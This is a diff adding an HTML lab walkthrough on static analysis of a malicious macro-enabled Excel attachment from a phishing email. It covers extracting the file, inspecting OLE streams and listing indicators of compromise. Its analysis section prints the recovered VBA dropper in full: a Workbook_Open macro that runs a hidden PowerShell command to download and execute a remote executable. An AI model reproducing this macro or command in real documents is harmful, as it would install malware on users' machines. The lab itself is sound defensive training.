@@ -1,0 +1,530 @@
+<html><head><style>body {
+  font-family: Helvetica, arial, sans-serif;
+  font-size: 16px;
+  line-height: 1.6;
+  padding-top: 0px;
+  padding-bottom: 0px;
+  background-color: white;
+  padding: 10px;
+  color: #333;
+}
+
+body > *:first-child {
+  margin-top: 0 !important;
+}
+
+body > *:last-child {
+  margin-bottom: 0 !important;
+}
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a.absent {
+  color: #cc0000;
+}
+
+a.anchor {
+  display: block;
+  padding-left: 30px;
+  margin-left: -30px;
+  cursor: pointer;
+  position: absolute;
+  top: 0;
+  left: 0;
+  bottom: 0;
+}
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+  cursor: text;
+  position: relative;
+}
+
+h2:first-child, h1:first-child, h1:first-child + h2, h3:first-child, h4:first-child, h5:first-child, h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1:hover a.anchor, h2:hover a.anchor, h3:hover a.anchor, h4:hover a.anchor, h5:hover a.anchor, h6:hover a.anchor {
+  text-decoration: none;
+}
+
+h1 tt, h1 code {
+  font-size: inherit;
+}
+
+h2 tt, h2 code {
+  font-size: inherit;
+}
+
+h3 tt, h3 code {
+  font-size: inherit;
+}
+
+h4 tt, h4 code {
+  font-size: inherit;
+}
+
+h5 tt, h5 code {
+  font-size: inherit;
+}
+
+h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: black;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #cccccc;
+  color: black;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777777;
+  font-size: 14px;
+}
+
+p, blockquote, ul, ol, dl, li, table, pre {
+  margin: 15px 0;
+}
+
+hr {
+  border: 0 none;
+  color: #cccccc;
+  height: 4px;
+  padding: 0;
+}
+
+body > h2:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+body > h1:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+body > h1:first-child + h2 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+body > h3:first-child, body > h4:first-child, body > h5:first-child, body > h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1 p, h2 p, h3 p, h4 p, h5 p, h6 p {
+  margin-top: 0;
+}
+
+li p.first {
+  display: inline-block;
+}
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul :first-child, ol :first-child {
+  margin-top: 0;
+}
+
+ul :last-child, ol :last-child {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt > :first-child {
+  margin-top: 0;
+}
+
+dl dt > :last-child {
+  margin-bottom: 0;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd > :first-child {
+  margin-top: 0;
+}
+
+dl dd > :last-child {
+  margin-bottom: 0;
+}
+
+blockquote {
+  border-left: 4px solid #dddddd;
+  padding: 0 15px;
+  color: #777777;
+}
+
+blockquote > :first-child {
+  margin-top: 0;
+}
+
+blockquote > :last-child {
+  margin-bottom: 0;
+}
+
+table {
+  padding: 0;
+}
+table tr {
+  border-top: 1px solid #cccccc;
+  background-color: white;
+  margin: 0;
+  padding: 0;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+table tr th {
+  font-weight: bold;
+  border: 1px solid #cccccc;
+  text-align: left;
+  margin: 0;
+  padding: 6px 13px;
+}
+
+table tr td {
+  border: 1px solid #cccccc;
+  text-align: left;
+  margin: 0;
+  padding: 6px 13px;
+}
+
+table tr th :first-child, table tr td :first-child {
+  margin-top: 0;
+}
+
+table tr th :last-child, table tr td :last-child {
+  margin-bottom: 0;
+}
+
+img {
+  max-width: 100%;
+}
+
+span.frame {
+  display: block;
+  overflow: hidden;
+}
+
+span.frame > span {
+  border: 1px solid #dddddd;
+  display: block;
+  float: left;
+  overflow: hidden;
+  margin: 13px 0 0;
+  padding: 7px;
+  width: auto;
+}
+
+span.frame span img {
+  display: block;
+  float: left;
+}
+
+span.frame span span {
+  clear: both;
+  color: #333333;
+  display: block;
+  padding: 5px 0 0;
+}
+
+span.align-center {
+  display: block;
+  overflow: hidden;
+  clear: both;
+}
+
+span.align-center > span {
+  display: block;
+  overflow: hidden;
+  margin: 13px auto 0;
+  text-align: center;
+}
+
+span.align-center span img {
+  margin: 0 auto;
+  text-align: center;
+}
+
+span.align-right {
+  display: block;
+  overflow: hidden;
+  clear: both;
+}
+
+span.align-right > span {
+  display: block;
+  overflow: hidden;
+  margin: 13px 0 0;
+  text-align: right;
+}
+
+span.align-right span img {
+  margin: 0;
+  text-align: right;
+}
+
+span.float-left {
+  display: block;
+  margin-right: 13px;
+  overflow: hidden;
+  float: left;
+}
+
+span.float-left span {
+  margin: 13px 0 0;
+}
+
+span.float-right {
+  display: block;
+  margin-left: 13px;
+  overflow: hidden;
+  float: right;
+}
+
+span.float-right > span {
+  display: block;
+  overflow: hidden;
+  margin: 13px auto 0;
+  text-align: right;
+}
+
+code, tt {
+  margin: 0 2px;
+  padding: 0 5px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+.highlight pre {
+  background-color: #f8f8f8;
+  border: 1px solid #cccccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #cccccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}</style></head><body><h1 id="performing-static-maldoc-malicious-office-document-analysis">Performing Static MalDoc (Malicious Office Document) Analysis</h1>
+<h2 id="scenario">Scenario</h2>
+<p>Your SOC team received a ticket for a suspicious email reported by an employee. The email contains an attachment—a Microsoft Excel document—that appears to be part of a phishing attempt. Your goal is to analyze the email to determine if the attached document is malicious and to identify any Indicators of Compromise (IoCs). </p>
+<p>In this scenario, you will explore analysis techniques for identifying malicious Microsoft Office documents (MalDocs) without executing them. You&#39;ll learn how to safely enumerate and extract attachments from emails, examine the document&#39;s OLE (Object Linking and Embedding) structure, and perform static analysis to detect malware artifacts and uncover embedded payloads or macros.</p>
+<p>The email can be found in this directory, named <code>Invoice.eml</code>. A preview of the email in the Mozilla Thunderbird email client can be seen here:</p>
+<p><img src="https://github.com/user-attachments/assets/34574d8f-83f0-4edb-84cd-f77419cad46a" alt="Due Invoide Payment email excerpt"></p>
+<p>As we can see above, the email references a document for confirmation which has been attached to the email as <code>invoice_11-2024.xlsm</code>. An <code>.xlsm</code> file is a type of <strong>Microsoft Excel</strong> file that supports macros. The file extension &quot;.xlsm&quot; stands for Excel Macro-Enabled Workbook. Unlike regular <code>.xlsx</code> files, which are standard Excel workbooks <em>without</em> macros, <code>.xlsm</code> files can contain embedded macros—small programs written in VBA (Visual Basic for Applications) that can automate tasks or, in some cases, execute malicious code if crafted by an attacker.</p>
+<h2 id="maldocs">MalDocs</h2>
+<p>As previously mentioned, a MalDoc (Malicious Document) is a document file, often in Microsoft Office formats like Word (<code>.doc</code>, <code>.docx</code>) or Excel (<code>.xls</code>, <code>.xlsm</code>), that has been crafted or modified to deliver malware. MalDocs are a common tool in phishing and social engineering attacks because they leverage macros, scripts, or embedded objects to execute malicious code on a target&#39;s machine.</p>
+<p><img src="https://github.com/user-attachments/assets/f68ca02a-6040-49ff-8de6-753f762b7484" alt="Record macros icon in Excel"></p>
+<p>Attackers often use MalDocs to weaponize malware because PDFs and Office documents are commonly shared and sent within legitimate business operations. By riding the wave of trust placed in these commonly exchanged file formats, attackers increase the likelihood that recipients will open the document and enable any embedded macros, unknowingly executing the malicious code. Additionally, MalDocs can often evade weak email security filter detections and bypass basic file extension allow lists, making them an attractive choice to deliver payloads over email.</p>
+<h2 id="email-attachments">Email Attachments</h2>
+<p>Email attachments are files sent alongside the email, which can range from documents (Office documents, PDFs, etc.) to images (JPGs, PNGs, etc.) or compressed archives (<code>.zip</code> files, etc.). These files are typically encoded within the email as a <strong>base64</strong> encoded string, depending on the encoding method used, to ensure safe transport across different email clients and systems.</p>
+<p>If we were to open up the <code>Invoice.eml</code> file in a text editor, we&#39;ll find that the attachment has been embedded at the bottom of the email file. </p>
+<p>In this lab, we&#39;ll learn how to extract and analyze these attachments to assess them for potential malware. Through various email headers, such as the <code>Content-Type</code>, the <code>Content-Transfer-Encoding</code>, and the <code>Content-Disposition</code>, we can infer that the email attachment is titled <code>invoice_11-2024.xlsm</code> and has been encoded using <code>base64</code>. </p>
+<p>These are the same headers that an email client would check in order to display a preview of the file in the client or browser.</p>
+<p><img src="https://github.com/user-attachments/assets/2c1ccde5-8bb9-44d7-8294-b26558b112f8" alt="The attachment section of an EML file"></p>
+<p>There are several ways to extract attachments from an email for analysis, such as saving it locally from an email client, downloading it from a ticketing system in the case of a phishing investigation, or using scripts to directly dump the attachment. Each approach has its pros and cons.</p>
+<p>In some cases, it&#39;s best—or not even necessary—to write the attachment to disk to perform a basic reputation analysis.</p>
+<h3 id="eioc-py">eioc.py</h3>
+<p>This leads us into tools like <code>eioc.py</code>, which is a <a href="https://github.com/MalwareCube/Email-IOC-Extractor">Python script</a> designed to aid in email forensic analysis by extracting various components from email files such as IP addresses, URLs, headers, and attachment metadata.</p>
+<p>If we run <code>eioc.py</code> against an email, it will provide us with several pieces of parsed and extracted indicators like IP addresses and important email headers, including the filenames and cryptographic hash values of any attachments.</p>
+<p><strong>First, make sure you&#39;re in the correct MalDoc Analysis directory:</strong></p>
+<pre><code>cd ~/Desktop/BSides_Ottaw<span class="hljs-built_in">a_2024</span>/MalDoc_Analysis
+</code></pre><p>To perform this, we can simply use Python to call the <code>eioc.py</code> script, which is located in the <code>Tools</code> directory, and provide it the <code>Invoice.eml</code> file:</p>
+<pre><code>python3 Tools/eioc<span class="hljs-selector-class">.py</span> Invoice.eml
+</code></pre><p><img src="https://github.com/user-attachments/assets/2d7a1926-513d-4556-bd9a-4207b4123a55" alt="The output of eioc.py"></p>
+<p>And with a single command, we&#39;ve extracted the MD5, SHA1, and SHA256 hash values of the document without even writing it to disk, minimizing the risk of accidental clicks or execution.</p>
+<p>We can now take any of these hash values and perform a reputation lookup by checking its hash against threat intelligence databases to determine if the file is known to be malicious.</p>
+<p>For example, if we head over to <a href="https://virustotal.com">VirusTotal</a>, we can search for the file&#39;s MD5 hash <code>3064726b643cf933c803d572ae56e925</code>: </p>
+<p><img src="https://github.com/user-attachments/assets/a45255d2-c395-4d5c-929c-73670dff4c93" alt="Virustotal submission page"></p>
+<p>Upon doing so, we will quickly discover that this file was flagged as malicious by almost 40 security vendors, all claiming that the file is some kind of <strong>trojan downloader</strong>.</p>
+<p><img src="https://github.com/user-attachments/assets/7aa13121-9974-4cea-8ec7-ed2cb07dbaaa" alt="Virustotal results page"></p>
+<h2 id="extracting-email-attachments">Extracting Email Attachments</h2>
+<p>In some cases, we may still need to extract the attachment from an email in order to perform static and dynamic malware analysis. With an attachment safely extracted, an analyst can perform static analysis to inspect the file&#39;s structure, metadata, and embedded objects, as well as dynamic analysis by safely executing the file in a controlled environment to observe its behavior.</p>
+<h3 id="emldump-py">emldump.py</h3>
+<p>One useful tool for extracting email attachments is <code>emldump.py</code>, developed by <a href="https://github.com/DidierStevens/DidierStevensSuite/tree/master">Didier Stevens</a>. This script is designed to parse email files and extract the attachments without having to open them in an email client. It also can allow us to automate the process of attachment extraction, making it easier to handle larger volumes of suspicious emails at once.</p>
+<p>To safely extract the Excel document from the email, we can simply run <code>emldump.py</code> and point it to the email in question:</p>
+<pre><code>python3 Tools/emldump<span class="hljs-selector-class">.py</span> Invoice.eml
+</code></pre><p>This command extracts the content of the <code>.eml</code> file and displays its multipart structure in the form of various streams or indexes. Interestingly, the fourth stream (<code>4:</code>) is labeled <code>invoice_11-2024.xlsm</code>. The <code>application/octet-stream</code> MIME type typically indicates a binary file, which in this case is a Microsoft Excel file with macros enabled, and its size is 736,278 bytes.</p>
+<p><img src="https://github.com/user-attachments/assets/7d46de52-eaf0-470d-a31f-5dea674674e9" alt="emldump.py output"></p>
+<p>Now that we know the correct stream we want to extract, we can run the command again to select it using the <code>-s 4</code> argument (to indicate the fourth stream), along with <code>-d</code> to dump the file to disk. If we run this as is, the contents of the file will be dumped to the terminal. Instead, we want to direct the output to its own file using the <code>&gt;</code> operator:</p>
+<pre><code>python3 Tools/emldump<span class="hljs-selector-class">.py</span> Invoice<span class="hljs-selector-class">.eml</span> -s <span class="hljs-number">4</span> -d &gt; invoice_11-<span class="hljs-number">2024</span>.xlsm
+</code></pre><p><img src="https://github.com/user-attachments/assets/4c572896-ea83-4641-a42b-02134d2436ff" alt="emldump.py output"></p>
+<p>To further verify we&#39;ve extracted the correct file, we can run <code>md5sum</code> against the file and compare it to our output from <code>eioc.py</code>:</p>
+<pre><code><span class="hljs-selector-tag">md5sum</span> <span class="hljs-selector-tag">invoice_11-2024</span><span class="hljs-selector-class">.xlsm</span>
+</code></pre><p><img src="https://github.com/user-attachments/assets/a3944768-b417-4cae-b43f-a463f6535d4b" alt="md5sum output"></p>
+<p>And we have a match!</p>
+<p>Now that we&#39;ve successfully extracted the suspicious attachment, let&#39;s turn to understanding the structure of Office documents and how we can analyze them for potential malware.</p>
+<h2 id="object-linking-and-embedding-ole-">Object Linking and Embedding (OLE)</h2>
+<p>OLE (Object Linking and Embedding) is a technology developed by Microsoft that allows embedding and linking to documents and objects within other documents. It enables applications like Microsoft Word, Excel, and PowerPoint to link or embed content from other files, such as images, charts, or other documents.</p>
+<p>Office documents, such as Excel files (<code>.xlsm</code>), are structured using the OLE format, which stores data and objects in streams. By examining the structure of these documents, we can identify embedded macros, hidden scripts, or other potential indicators of compromise.</p>
+<h3 id="oledump-py">oledump.py</h3>
+<p>Another useful Python-based tool developed by <a href="https://github.com/DidierStevens/DidierStevensSuite/tree/master">Didier Stevens</a> is <code>oledump.py</code>. OLEDump is often used in malware analysis and digital forensics to examine the internal structure of Office files. While there&#39;s a lot we can do with it (see the <code>-h</code> menu for all of its features), we will keep it simple and attempt to extract the contents of any embedded macros.</p>
+<p>First, we can simply run the <code>oledump.py</code> script against the invoice file that we&#39;ve already extracted:</p>
+<pre><code>pytho<span class="hljs-symbol">n3</span> Tools/oledump.py i<span class="hljs-symbol">nvoice_11</span><span class="hljs-number">-2024.</span>xlsm
+</code></pre><p><img src="https://github.com/user-attachments/assets/00f3de12-892d-4541-aa6b-dc35067d991e" alt="oledump.py output"></p>
+<p>Similar to <code>emldump.py</code>, OLEDump breaks the file down into individual streams based on the OLE structure.</p>
+<p><code>A: xl/vbaProject.bin</code> refers to the VBA (Visual Basic for Applications) project file stored within the Excel document, which contains the macros and code that can be executed when the document is opened.</p>
+<p>It appears that there are a number of entries related to the project file, sheets, and workspaces - however, one entry that stands out is <code>A4: M 634 &#39;VBA/ThisWorkbook&#39;</code> due to the capital <code>M</code> indicator in the second column. The letter M next to stream 4 indicates that the stream contains VBA macros, which is exactly what we&#39;re looking to analyze.</p>
+<h3 id="select-stream">Select Stream</h3>
+<p>Now that we know which stream contains a macro (the fourth stream), we can select it using the <code>-s 4</code> argument. Upon doing so, you&#39;ll notice it returns a long table of (at first) seemingly random characters:</p>
+<pre><code>python3 Tools/oledump<span class="hljs-selector-class">.py</span> invoice_11-<span class="hljs-number">2024</span><span class="hljs-selector-class">.xlsm</span> -s <span class="hljs-number">4</span>
+</code></pre><p><img src="https://github.com/user-attachments/assets/e769dbcf-4d5b-44e6-9177-539b21f409b2" alt="oledump.py output"></p>
+<p>The result we get from <code>oledump.py</code> is essentially a hexadecimal dump of the raw contents of that stream, displaying the embedded VBA macros and related data (additional properties or objects). To break down the different columns that are returned:</p>
+<ul>
+<li><p>The <strong>leftmost column</strong> shows the offset values in hexadecimal, which represent the position of the data within the stream. For example, the first row has the offset <code>00000000</code>, which means the data in that row starts at the very beginning of the stream.</p>
+</li>
+<li><p>The <strong>middle column</strong> contains the hexadecimal representation of the raw byte data at each offset. Each byte is displayed as a two-digit hexadecimal value (e.g., <code>01</code>, <code>76</code>, <code>B2</code>, etc.).</p>
+</li>
+<li><p>The <strong>rightmost column</strong> contains the ASCII (human-readable) representation of the hexadecimal data from the middle column. This is useful because it helps to identify any readable strings or keywords embedded in the binary data, such as file names, function names, variables or other relevant keywords.</p>
+</li>
+</ul>
+<p>For example, as we scroll through the ASCII output, we can make out certain fragments like <code>pow.ers..-Win@dowSty.Rh.idden</code> or <code>I.nvoke-We.bRequest. -Uri</code>, hinting that this macro might contain some PowerShell commands. </p>
+<h3 id="strings-dump">Strings Dump</h3>
+<p>To look into these interesting keywords further, we can use the <code>-S</code> operator with <code>oledump.py</code> to return any human-readable string values from the VBA macro&#39;s contents. This is just like running the <code>strings</code> command in the terminal against a file to search for sequences of printable characters, typically ASCII or Unicode:</p>
+<pre><code>python3 Tools/oledump<span class="hljs-selector-class">.py</span> invoice_11-<span class="hljs-number">2024</span><span class="hljs-selector-class">.xlsm</span> -s <span class="hljs-number">4</span> -S
+</code></pre><p><img src="https://github.com/user-attachments/assets/a140b419-d160-4f87-87ea-600618d5bf90" alt="oledump.py output"></p>
+<p>Although the output is still a bit unclear, we can start to make out hints to more of these keywords like:</p>
+<ul>
+<li><code>-WindowStyle Hidden</code>: This flag tells PowerShell to run the script in the background without displaying a window. While used in legitimate PowerShell scripts, it can also be used to execute a malicious script silently.</li>
+<li><code>-ExecutionPolicy Bypass</code>: This flag instructs PowerShell to bypass any security policies set on the system that would normally prevent the execution of scripts. </li>
+<li><code>Invoke-WebRequest</code>: This command in PowerShell is used to send HTTP or HTTPS requests to a specified URL, often to download files or retrieve data from a remote server. Often MalDocs that contain VBA macros act as a &quot;dropper&quot; that, once executed, will fetch or &quot;drop&quot; additional malware onto the system.</li>
+</ul>
+<p>Interestingly, we can even start to make out a URL and IP address as potential Indicators of Compromise (IoCs):</p>
+<pre><code><span class="hljs-symbol">http:</span><span class="hljs-comment">//3</span>
+<span class="hljs-number">.73</span><span class="hljs-number">.132</span>.
+<span class="hljs-number">53</span><span class="hljs-meta-keyword">/hz/</span>Et
+olfsojm.
+</code></pre><p>However, we can take this one step further.</p>
+<h3 id="vba-decompression">VBA Decompression</h3>
+<p>Finally, we can attempt to use the decompression features of <code>oledump.py</code> to extract the full contents of the macro. To do so, we simply replace <code>-S</code> with <code>--vbadecompresscorrupt</code>:</p>
+<pre><code>python3 Tools/oledump<span class="hljs-selector-class">.py</span> invoice_11-<span class="hljs-number">2024</span><span class="hljs-selector-class">.xlsm</span> -s <span class="hljs-number">4</span> --vbadecompresscorrupt
+</code></pre><p><img src="https://github.com/user-attachments/assets/925dbc71-8ec3-4353-bc84-27e801ed1286" alt="oledump.py output"></p>
+<p>Upon doing so, we return the complete output of the malicious VBA script embedded into the document and we can now analyze the code to understand what it is doing. At a high level, the macro leverages PowerShell to act as a dropper when the workbook is opened, it downloads and executes a malicious file from the internet.</p>
+<p><strong>To understand it in more detail:</strong></p>
+<p>The code begins with the <code>Workbook_Open()</code> subroutine, which is triggered when the workbook is opened:</p>
+<pre><code><span class="hljs-keyword">Private</span> <span class="hljs-keyword">Sub</span> Workbook_Open()
+</code></pre><p>It then defines a couple of variables, <code>sCommand</code> for the PowerShell command, and <code>sOutput</code> to store the output from the command execution:</p>
+<pre><code><span class="hljs-keyword">Dim</span> sCommand <span class="hljs-keyword">As</span> <span class="hljs-built_in">String</span>, sOutput <span class="hljs-keyword">As</span> <span class="hljs-built_in">String</span>
+<span class="hljs-keyword">Dim</span> oWshShell <span class="hljs-keyword">As</span> <span class="hljs-built_in">Object</span>, oWshShellExec <span class="hljs-keyword">As</span> <span class="hljs-built_in">Object</span>
+</code></pre><p>The <code>sCommand</code> variable is assigned a PowerShell command string. This command performs several actions, starting with setting the execution policy to bypass and running PowerShell with a hidden window (<code>-WindowStyle hidden</code>):</p>
+<pre><code><span class="hljs-attribute">sCommand</span> = <span class="hljs-string">"powershell -WindowStyle hidden -executionpolicy bypass; <span class="hljs-variable">$TempFile</span> = [IO.Path]::GetTempFileName() | Rename-Item -NewName { <span class="hljs-variable">$_</span> -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri "</span><span class="hljs-string">"http://3.73.132.53/hz/Etolfsojm.exe"</span><span class="hljs-string">" -OutFile <span class="hljs-variable">$TempFile</span>; Start-Process <span class="hljs-variable">$TempFile</span>;"</span>
+</code></pre><p>The specific PowerShell command that gets executed then: </p>
+<ol>
+<li>Creates a temporary file with an <code>.exe</code> extension.</li>
+<li>Uses <code>Invoke-WebRequest</code> to download a file named <code>Etolfsojm.exe</code> from <code>http://3.73.132.53/hz/</code>.</li>
+<li>Executes the downloaded executable with <code>Start-Process</code>.</li>
+</ol>
+<h2 id="conclusion">Conclusion</h2>
+<p>Great work! We were able to securely extract the attachment from the email and use basic static analysis techniques to parse through the OLE objects. By doing so, we were able to understand the true nature of the document&#39;s embedded macro and document a number of malicious indicators.</p>
+<p>We can even go as far as submitting the URL we identified in the macro against malware databases - again, by using <a href="https://virustotal.com">VirusTotal</a>:</p>
+<p><img src="https://github.com/user-attachments/assets/fb9d237e-2daa-49e7-bd4d-ded0cb27e4e3" alt="Virustotal submission page"></p>
+<p>Upon doing so, we will quickly discover that this URL was flagged as malicious by 10 or so security vendors, further supporting our findings that this email was a phishing attempt.</p>
+<p><img src="https://github.com/user-attachments/assets/46b0756b-06ec-4682-9b1e-f329a26cccbd" alt="Virustotal results page"></p>
+<h2 id="indicators-of-compromise-iocs-">Indicators of Compromise (IoCs)</h2>
+<p>It&#39;s always a good idea to document the malicious artifacts we gathered during our investigation. Below, I have done so in <em>defanged</em> format. Defanging is a way to alter potentially dangerous URLs, IP addresses, and file paths to prevent them from being clickable or accidentally executed.</p>
+<h3 id="email-address">Email Address</h3>
+<ul>
+<li><code>Paol[.]Reggiani@moss[.]it</code></li>
+</ul>
+<h3 id="files">Files</h3>
+<ul>
+<li><code>invoice_11-2024[.]xlsm</code><ul>
+<li>MD5: <code>3064726b643cf933c803d572ae56e925</code></li>
+<li>SHA1: <code>af73eee09bfe11fe8475aec38d7742215432b063</code></li>
+<li>SHA256: <code>7637a06005c3e90cedae65054c0458d02a66865e1f91c61b5b7ba1ccf3303587</code></li>
+</ul>
+</li>
+<li><code>Etolfsojm[.]exe</code></li>
+</ul>
+<h3 id="ip-addresses">IP Addresses</h3>
+<ul>
+<li><code>3[.]73[.]132[.]53</code></li>
+<li><code>213[.]227[.]154[.]65</code></li>
+</ul>
+<h3 id="urls">URLs</h3>
+<ul>
+<li><code>hxxp[://]3[.]73[.]132[.]53/hz/Etolfsojm[.]exe</code></li>
+</ul>
+<h2 id="tcm-security-promo-code">TCM Security - Promo Code</h2>
+<p><img src="https://github.com/user-attachments/assets/90283a54-d164-4990-a09b-4edb84ac661e" alt="TCM Security logo"></p>
+<p>If you enjoyed this scenario and lesson, be sure to check out TCM Security&#39;s <a href="https://academy.tcm-sec.com/p/security-operations-soc-101">Security Operations (SOC) 101</a>, a 30+ hour training course that dives deep into Phishing Analysis, Network Traffic Analysis, Endpoint Detection and Response, Log Analysis and Management, Security Information and Event Management (SIEM), Threat Intelligence, and DFIR operations. 😎🛡️</p>
+<p>🚨 Use the limited time promo code <code>BSIDESOTTAWA</code> to save 50% off the TCM Academy! :)</p>
+</body></html>
